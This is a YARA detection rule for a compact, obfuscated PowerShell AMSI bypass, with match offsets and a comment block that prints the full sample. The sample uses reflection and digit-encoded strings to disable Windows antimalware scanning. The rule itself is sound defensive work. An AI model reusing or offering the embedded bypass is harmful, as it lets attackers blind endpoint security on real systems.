rule PS_AMSI_Bypass_Compact {
	meta:
		author = "James E.C, Emerging Threats - Proofpoint"
		twitter = "@EcOzurie"
		mastodon = "https://infosec.exchange/@ozurie"
		description = "Detects a compact AMSI bypass attempt (or something obscure at the very least)"
		reference = "https://twitter.com/cyb3rops/status/1588574518057979905/photo/1"
	strings:
		$k1 = "|%{[char][" ascii nocase
		$k2 = "+($" ascii
		$s1 = ".Assembly.GetType([" ascii nocase
		$s2 = "SetValue(" ascii nocase
		$s3 = "GetField([" ascii nocase
		$s4 = "-replace" ascii nocase
	condition:
		filesize < 100KB and all of ($k*) and 2 of ($s*)
}

/*
PS_AMSI_Bypass_Compact florian_roth_20221104.bin
0x99:$k1: |%{[char][
0xf2:$k1: |%{[char][
0xaa:$k2: +($
0x103:$k2: +($
0x79:$s1: .Assembly.GetType([
0x14a:$s2: SetValue(
0xda:$s3: GetField([
0xca:$s4: -replace
0x123:$s4: -replace

===============

$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'Non' + 'Public,Static').
SetValue($null,$true)
*/
